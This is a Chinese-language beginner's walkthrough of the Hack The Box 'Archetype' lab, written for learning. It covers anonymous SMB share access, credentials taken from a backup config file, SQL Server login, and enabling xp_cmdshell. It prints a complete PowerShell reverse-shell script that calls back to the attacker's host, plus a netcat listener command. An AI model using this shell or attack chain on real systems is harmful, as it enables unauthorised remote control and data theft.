注册好hack the box之后，Archetype将是第一个入门级靶机，友好简单但是对于我这种小白依旧能学到很多东西

将靶机激活activity后，呆瓜的我一开始怎么也没办法nmap扫描到靶机的ip地址10.10.10.27，倒腾半天才知道我的hack the
box状态是offline![1617167656_60640528557c5dea19ce1.png!small](https://image.3001.net/images/20210331/1617167656_60640528557c5dea19ce1.png!small)

点击OFFLINE后选择US或者EU节点，下载对应的xxx.ovxpn文件，拷贝到kali，终端输入命令：openvxpn
xxx.ovxpn，等待几分钟就连接上靶机了  
![图片.png](https://image.3001.net/images/20210331/1617204923_606496bba7aebbf1630f1.png!small)  
-sC：使用默认脚本  
-sV：探测系统版本

 **445端口**
是一个毁誉参半的端口，有了它我们可以在局域网中轻松访问各种共享文件夹或共享打印机（SMB协议），但也正是因为有了它，黑客们才有了可乘之机，他们能通过该端口偷偷共享你的硬盘，甚至会在悄无声息中将你的硬盘格式化掉！2017年10月，由于病毒“坏兔子”来袭，国家互联网响应中心等安全机构建议用户及时关闭计算机以及网络设备上的445和139端口

kali linux预装的smbclient工具可以让linux系统访问windows系统发布的共享资源

> smbclient - ftp-like client to access SMB/CIFS resources on servers
>
> -L|--list（共享文件列表）  
> This option allows you to look at what services are available on a server.
> You use it as smbclient -L host and a list should appear.
>
>  
>  
> -N|--anonymous（匿名登录）
>
> If specified, this parameter suppresses the normal password prompt from the
> client to the user.This is useful when accessing a service that does not
> require a password.

![图片.png](https://image.3001.net/images/20210331/1617205013_60649715ecf0ced33981f.png!small)  
-N ：不需要密码登录，匿名登录  
-L：将共享文件以列表显示出来

发现一个文件夹 backups，备份，有可能有重要的信息  
![图片.png](https://image.3001.net/images/20210331/1617205299_606498334382c9288a1ee.png!small)  
发现一个配置文件，使用get命令下载到本地。【加上-L命令无法查看backups，因为-L只能针对主机，而无法针对文件夹，最后的/可以不加】  
![图片.png](https://image.3001.net/images/20210331/1617205645_6064998dcfcabe87d8222.png!small)  
发现一个用户名和密码，应该是服务器的一个用户，还记得1433端口吗，背后的程序是SQL Server，可以尝试使用这个用户登录数据库

 **1433端口** 是SQL Server默认的端口，SQL Server服务使用两个端口：TCP-1433、UDP-1434。其中1433用于供SQL
Server对外提供服务，1434用于向请求者返回SQL Server使用了哪个TCP/IP端口。

> 很多人都说SQL
> Server配置的时候要把1433端口改变，这样别人就不能很容易地知道使用的什么端口了。可惜，通过微软未公开的1434端口的UDP探测可以很容易的知道SQL
> Server使用了什么TCP/IP端口。
>
> 不过微软还是考虑到了这个问题，毕竟公开而且开放的端口会引起不必要的麻烦。在实例属性中选择TCP/IP协议的属性。选择隐藏 SQL Server
> 实例。如果隐藏了 SQL Server 实例，则将禁止对试图枚举网络上现有的 SQL Server
> 实例的客户端所发出的广播作出响应。这样，别人就不能用1434来探测你的TCP/IP端口了。

可以通过Impacket/mssqlclient.py登录数据库  
![图片.png](https://image.3001.net/images/20210331/1617205790_60649a1e188ce73c1ea2e.png!small)  
一开始登录失败，后面将用户名修改之后登录成功。  
mssqlclient.py的参数：用户名@服务器ip地址  
-windows-auth指明使用windows验证登录数据库，局域网的用户登录数据库不需要id和密码，虽然我这里依旧需要id和密码，但如果没有这个参数，就无法登录成功。WINDOWS身份验证很好理解,只要有权限登陆系统就有权限操作SQL SERVER

此时已登录SQL Server，键入help查看额外的shell命令  
![图片.png](https://image.3001.net/images/20210401/1617207016_60649ee8dd658b2b83b49.png!small)  
键入命令'enable_xp_cmdshell'，发现SQL Server已经可以执行shell命令了  
![图片.png](https://image.3001.net/images/20210401/1617207308_6064a00c260f6056beaeb.png!small)  
但如果value是0的话，可以手动配置  
![图片.png](https://image.3001.net/images/20210401/1617207347_6064a03369f612bb63d37.png!small)

EXEC可用于执行查询语句或者存储过程【在本题中，我没用EXEC也能成功】;  
sp_configure显示或更改当前服务器的全局配置设置。  
语法:  
sp_configure [ [ @configname = ] 'name' ]  
[ , [ @configvalue = ] 'value' ]  
sp_configure 支持的某些选项指派为"高级"。默认情况下，无法查看和更改这些选项；将 Show Advanced Options 配置选项设为
1。  
使用 sp_configure 更改设置时，请使用 RECONFIGURE WITH OVERRIDE 语句使更改立即生效。否则，更改将在 SQL
Server 重新启动后生效。

![图片.png](https://image.3001.net/images/20210401/1617208060_6064a2fcb00ef76953f10.png!small)  
好吧，xp_cmdshell存储过程还是无法使用，还是要手动配置一下  
![图片.png](https://image.3001.net/images/20210401/1617208127_6064a33fa67aa10142a0b.png!small)  
xp_cmdshell "shell命令"：xp_cmdshell是SQL Server的一个存储过程，可以调用终端的shell命令。  
既然我能在服务器上使用shell命令，那么我就能实现反向shell，让服务器连接上我本机的端口，实现对服务器的访问。

此前nmap的扫描结果可以看到靶机操作系统是windows server 2008
r2，此版本默认安装有powershell，可以从powershell入手。有很多利用powershell获得的反向shell的工具/脚本，如powercat（netcat的powershell版本）、Nishang、Invoke-PowerShell（有TCP、UDP、ICMP三种版本），此处使用powercat。powercat其实是用powershell命令编写的函数。

    
    
    $client = New-Object System.Net.Sockets.TCPClient("10.10.14.3",443);
    $stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};
    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
    {;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()};
    $client.Close()
    

将上述代码保存为shell.ps1,并在同一目录下开启一个简易服务器，以便目标服务器能够访问到该shell脚本并执行。  
![图片.png](https://image.3001.net/images/20210401/1617209533_6064a8bd3f9af29fd6fc8.png!small)  
再开启一个终端，监听443端口  
nc -lvnp 443  
该命令将#{remote_script}加载到内存并执行，并没有把该脚本下载到本地。  
![图片.png](https://image.3001.net/images/20210401/1617209609_6064a909a30947ffe6b35.png!small)  
本来想试试http那一块的双引号改成单引号行不行，去掉头尾的转义字符行不行，但是这数据库一段时间就嗝屁，必须重新手动配置show advanced
options和xp_cmdshell，搞得烦死了，就不行再试了  
服务器执行shell.ps1，与本主机的443端口建立连接，[10.10.16.65是本主机的ip,是hack the
box自动给我加上的.],之后本主机就获得了服务器的shell,随意查看服务器的文件  
![图片.png](https://image.3001.net/images/20210401/1617209918_6064aa3eb423b9cd3d0ad.png!small)  
![图片.png](https://image.3001.net/images/20210401/1617209994_6064aa8a252c7b4597389.png!small)  
![图片.png](https://image.3001.net/images/20210401/1617210014_6064aa9e8871af34d2808.png!small)  
![图片.png](https://image.3001.net/images/20210401/1617210032_6064aab0ec13c7661bb21.png!small)  
获得flag  
![图片.png](https://image.3001.net/images/20210401/1617249177_60654399515e53832bc1f.png!small)  
目标服务器是windows server 2008，或许powershell命令历史记录也存在这个文件中  
![图片.png](https://image.3001.net/images/20210401/1617249259_606543eb9b5af0970e6f1.png!small)

